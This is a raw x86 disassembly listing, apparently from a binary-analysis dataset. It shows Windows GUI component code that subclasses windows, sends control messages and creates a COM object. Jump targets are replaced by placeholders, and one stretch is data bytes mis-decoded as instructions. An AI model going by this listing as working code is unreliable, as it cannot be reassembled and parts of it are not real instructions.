xor ecx ecx
mov [ edx + 0xc ] ecx
mov eax [ eax + 0x8 ]
sub eax 0xfffffd09
je r-xdata
mov ebx [ edx + 0x8 ]
cmp [ esi + 0x255 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ esi + 0x269 ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ edx + 0x8 ]
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0xc ]
call sub_404310
mov eax [ ebp - 0x10 ]
call sub_40b4c4
fstp [ ebp - 0x8 ]
fwait
cmp [ esi + 0x272 ] 0x0
je r-xdata
sub eax 0x4
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
lea eax [ ebx + 0x10 ]
call sub_43d1e4
test al al
je r-xdata
push esi
lea edi [ esi + 0x258 ]
lea esi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea eax [ esi + 0x258 ]
call sub_409ecc
fstp [ esi + 0x210 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x14 ]
mov edx [ ebx + 0xc ]
call sub_404310
mov ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ esi + 0x274 ]
call [ esi + 0x270 ]
mov al [ ebp - 0x9 ]
xor al 0x1
and eax 0x7f
mov [ ebx + 0x20 ] eax
jmp r-xdata
mov eax esi
call sub_43cb30
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ esi + 0x258 ]
call sub_409e8c
mov [ esi + 0x255 ] 0x1
cmp [ esi + 0x28a ] 0x0
je r-xdata
dec eax
jne r-xdata
mov eax esi
mov si 0xffb3
call sub_403518
jmp r-xdata
push esi
lea edi [ esi + 0x258 ]
lea esi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea eax [ ebx + 0x10 ]
call sub_409ecc
fstp [ ebp - 0x8 ]
fwait
cmp [ esi + 0x256 ] 0x0
jne r-xdata
mov [ esi + 0x252 ] 0x0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d701
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40413c
retn
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_409e8c
jmp r-xdata
mov edx esi
mov eax [ esi + 0x28c ]
call [ esi + 0x288 ]
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esi + 0x255 ] 0x0
lea eax [ esi + 0x258 ]
call sub_409ecc
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_43cb60
cmp [ esi + 0x27a ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax esi
call sub_43d93c
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax esi
call sub_43cb60
jmp r-xdata
mov edx esi
mov eax [ esi + 0x27c ]
call [ esi + 0x278 ]
jmp r-xdata
mov [ esi + 0x252 ] 0x1
cmp [ esi + 0x269 ] 0x0
je r-xdata
sub_43d738
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4553b8
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4550b4
mov ecx ebp
mov edx edi
call sub_42adc8
cmp eax 0xffffffff
setne bl
sub_43d76c
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov esi edx
lea edi [ ebp - 0x16 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4553b8
test al al
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x251 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x251 ] 0x1
xor eax eax
push ebp
push sub_43d808
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4550b4
lea ecx [ ebp - 0x16 ]
xor edx edx
call sub_42ad90
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x251 ] 0x0
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x252 ] dl
sub_43d818
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4553b8
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
mov eax esi
call sub_4550b4
mov ecx ebp
mov edx edi
call sub_42adac
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_43d878
push ebx
add esp 0xfffffff0
mov ebx eax
mov [ ebx + 0x252 ] dl
cmp [ ebx + 0x269 ] 0x0
je r-xdata
add esp 0x10
pop ebx
retn
test dl dl
je r-xdata
mov eax ebx
call sub_4550b4
mov ecx esp
mov edx 0x1
call sub_42ad90
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
mov eax ebx
call sub_43cc18
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43d93c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
fld [ ebx + 0x210 ]
call sub_402a98
fabs
fstp [ ebp - 0xc ]
fwait
fld [ ebp + 0x8 ]
call sub_402a98
fabs
fld [ ebp - 0xc ]
fcompp
fnstsw ax
sahf
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
lea eax [ ebp + 0x8 ]
call sub_40a008
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43cc18
cmp [ ebx + 0x269 ] 0x0
jne r-xdata
mov [ ebx + 0x252 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
sub_43d9d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x290 ]
mov edx esi
call sub_404524
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x290 ]
mov edx esi
call sub_40416c
mov eax [ ebx + 0x290 ]
call sub_4045d8
push eax
push 0x0
push 0x1005
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
sub_43da1c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_431da4
mov edi esi
mov eax [ edi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov eax [ edi + 0x24 ]
mov [ ebx + 0x24 ] eax
mov eax [ edi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
lea eax [ ebx + 0x10 ]
mov edx [ edi + 0x10 ]
call sub_40416c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43da68
push ebx
mov ebx eax
mov eax ebx
call sub_431ea4
mov eax ebx
call sub_4196d8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x2
je r-xdata
mov eax edx
call sub_43209c
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_43da9c
push ebx
mov ebx eax
mov eax ebx
call sub_431ec0
mov eax ebx
call sub_4196d8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x1
je r-xdata
mov eax edx
call sub_43209c
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_43daf0
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp eax 0xffffffff
je r-xdata
mov [ ebx + 0x1c ] edx
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax ebx
call sub_431ecc
mov eax ebx
call sub_4196d8
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_43db20
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419800
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop esi
pop ebx
retn
sub_43db80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax esi
call sub_43db74
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx [ ebp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x24 ] eax
mov edx [ ebp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_4196d8
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_43dbfc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_419c38
mov ebp eax
mov esi ebx
mov eax edi
call sub_419a38
mov ebx eax
dec ebx
sub ebx esi
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
sub_43dc34
push ebx
push esi
mov ebx edx
mov esi eax
sub cl 0x1
jb r-xdata
mov esi ebx
mov [ esi + 0x18 ] 0xffffffff
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x24 ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x10 ]
call sub_404118
pop esi
pop ebx
retn
sub cl 0x2
jb r-xdata
mov eax esi
call sub_419d48
test [ eax + 0x1c ] 0x8
jne r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
call sub_4196d8
push eax
push 0x144
mov eax esi
call sub_419d48
call sub_4550b4
push eax
call SendMessageA
sub_43dca8
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402d00
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0xc ] eax
mov eax esp
push eax
push 0x0
push 0x404
mov eax esi
call sub_419d48
call sub_4550b4
push eax
call SendMessageA
test eax eax
sete al
neg al
sbb ebp ebp
mov edx edi
mov eax esi
call sub_43dbe8
mov ebx eax
mov [ esp ] 0x37
mov eax [ ebx + 0x10 ]
call sub_4045d8
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_4196d8
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_4043d8
mov [ esp + 0xc ] eax
mov eax [ ebx + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x20 ]
mov [ esp + 0x18 ] eax
mov eax [ ebx + 0x24 ]
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x14 ]
mov [ esp + 0x20 ] eax
test ebp ebp
je r-xdata
mov eax esp
push eax
push edi
push 0x405
mov eax esi
call sub_419d48
call sub_4550b4
push eax
call SendMessageA
mov eax esp
push eax
push edi
push 0x401
mov eax esi
call sub_419d48
call sub_4550b4
push eax
call SendMessageA
jmp r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43de15
fld [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
fiadd [ ebx ]
sbb [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
dec esp
xor eax 0x5b380040
inc eax
add [ ebx + ebx * 2 + 0x40 ] al
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ ebx + ebx * 2 + 0x40 ] dl
add al dl
xor al [ eax ]
or al 0x33
inc eax
add [ 0x6d6f4354 ] dl
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ ecx + 0x27883 ] cl
js r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x1
push r-xdata
call GetModuleHandleA
mov esi eax
test esi esi
je r-xdata
add [ ebx - 0x5efe4d35 ] cl
enter 0x4364 0x0
cmp [ eax + 0x2 ] 0x0
outsb
jne r-xdata
push 0x0
call CoInitialize
push 0x2
push 0x0
call [ rw-data ]
jmp r-xdata
push r-xdata
push esi
call GetProcAddress
mov [ rw-data ] eax
mov [ ebx + 0x28c ] eax
mov dl 0x1
mov eax [ r-xdata ]
jb r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov esi eax
mov [ ebx + 0x27c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43e170
mov [ ebx + 0x289 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x26c ] al
cmp [ rw-data ] 0x0
jne r-xdata
add al [ eax ]
add [ ecx + 0x408b1058 ] cl
adc al 0x89
or [ edx + eax + 0x1b20000 ] 0xffffffa1
pushfd
mov bh 0x45
add al ch
add [ esp + edi * 8 - 0x1 ] edx
je r-xdata
call sub_4032ec
add [ ecx + r-xdata ] esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ esi - 0x2c ] al
fld [ ebx ]
adc al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
fiadd [ ebx ]
rcl [ ebp - 0x75 ] 0xec
push ecx
push ebx
push esi
test dl dl
je r-xdata
call sub_43e9ec
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10c ]
mov eax [ ebx + 0x23c ]
mov [ eax + 0x10 ] ebx
mov eax [ eax + 0x14 ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax 0x200
call sub_4368f8
mov ecx esi
xor edx edx
mov eax ebx
call sub_4446ec
push ebx
push sub_43e314
call sub_465660
mov [ ebx + 0x278 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
add esp 0xfffffff0
call sub_403668
sub_43df9b
add [ ebx + 0x56 ] dl
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_40331c
lea eax [ esi + 0x27c ]
call sub_40d814
mov eax esi
call sub_4553b8
test al al
je r-xdata
mov eax [ esi + 0x278 ]
call sub_465674
lea eax [ esi + 0x284 ]
call sub_40d814
lea eax [ esi + 0x268 ]
call sub_405ab8
call CoUninitialize
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4447e0
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_43e014
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0xfffffcdb
je r-xdata
cmp [ esi + 0x29a ] 0x0
je r-xdata
dec eax
jne r-xdata
pop esi
retn
mov edx esi
mov eax [ esi + 0x29c ]
call [ esi + 0x298 ]
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x292 ] 0x0
je r-xdata
mov edx esi
mov eax [ esi + 0x294 ]
call [ esi + 0x290 ]
pop esi
retn
sub_43e082
mov edx ebx
mov eax esi
call sub_451e6c
mov eax [ ebx + 0x4 ]
or eax 0x10000
or eax 0x200000
or eax 0x2000000
or eax 0x4
or eax 0x40
xor edx edx
mov dl [ esi + 0x289 ]
or eax [ edx * 4 + rw-data ]
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfffffdff
mov eax [ ebx + 0x24 ]
or eax 0x8
and eax 0xfffffffc
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_43e0dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x280 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x280 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_45c5c0
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov edx [ ebx + 0x27c ]
call sub_45c604
mov edx ebx
mov eax [ ebx + 0x280 ]
call sub_421b4c
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_44fa80
mov eax ebx
call sub_452654
mov eax [ ebx + 0x280 ]
call sub_45bc30
push eax
push 0x0
push 0x402
mov eax ebx
call sub_4550b4
push eax
call PostMessageA
pop esi
pop ebx
retn
sub_43e170
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45bc30
push eax
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_44fa80
sub_43e19c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_444e1c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x289 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_425300
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_43e1e4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44dd84
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x280 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43e0dc
sub_43e214
push ebx
mov ebx eax
mov eax ebx
call sub_4504a4
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x289 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43e23c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4545e8
mov eax ebx
call sub_4553b8
test al al
je r-xdata
add esp 0x10
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x270 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x240 ]
test eax eax
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
sub_43e29c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44ff50
mov eax ebx
call sub_44eadc
test al al
je r-xdata
cmp [ ebx + 0x289 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4657c8
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44ef74
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44eaec
sub_43e334
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43e647
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_445184
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call GetWindow
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] ebx
mov esi ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x270 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x274 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x289 ]
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call GetWindow
push eax
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x284 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x289 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x280 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x1
xor eax eax
push ebp
push sub_43e54b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x284 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_419a38
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x240 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x250 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x244 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x258 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push ebx
call GetWindow
mov ebx eax
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x28a ]
mov eax [ ebp - 0x4 ]
call sub_43e680
mov eax [ ebp - 0x4 ]
add eax 0x268
call sub_405ab8
mov eax [ ebp - 0x4 ]
add eax 0x268
call sub_405ab8
push eax
push sub_43e654
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_45bc30
push eax
push 0x0
push 0x402
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call PostMessageA
mov eax [ ebp - 0x4 ]
add eax 0x284
call sub_40d814
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_44e9a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x288 ] 0x0
retn
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e64e
lea eax [ ebp - 0x8 ]
call sub_405ab8
retn
push 0x0
push 0x0
push 0x407
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call SendMessageA
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43eef0
mov edx eax
test edx edx
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_405ad0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43e814
sub edx 0xffffffec
sub_43e680
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
xor edi edi
mov al [ esp ]
mov [ ebx + 0x28a ] al
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov esi rw-data
jae r-xdata
and edx 0x7f
bt [ ebx + 0x28a ] edx
inc eax
add esi 0x4
cmp al 0x5
jne r-xdata
or edi [ esi ]
mov edx eax
cmp dl 0x7
ja r-xdata
push edi
push 0x0
push 0x40e
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
sub_43e6e0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_455b84
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_43e0dc
cmp [ edi + 0x280 ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_43e744
push ebx
mov ebx eax
mov eax ebx
call sub_44536c
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax ebx
call sub_452654
sub_43e788
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28c ]
call sub_419a38
test eax eax
jle r-xdata
mov eax ebx
call sub_452450
pop esi
pop ebx
retn
cmp [ ebx + 0x284 ] 0x0
jne r-xdata
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419830
mov esi eax
mov [ ebx + 0x284 ] esi
mov edx [ ebx + 0x28c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43e7d8
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4553b8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
cmp eax [ esi + 0x270 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_43e814
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43e911
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4553b8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e918
lea eax [ ebp - 0x4 ]
call sub_405ab8
retn
cmp [ ebx + 0x268 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_405ab8
mov ecx eax
mov edx sub_43e91c
mov eax [ ebx + 0x268 ]
call sub_40d824
test al al
je r-xdata
test [ ebx + 0x26c ] 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x268 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov al [ r-xdata ]
cmp al [ ebx + 0x26c ]
jne r-xdata
xor eax eax
test [ ebx + 0x26c ] 0x1
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
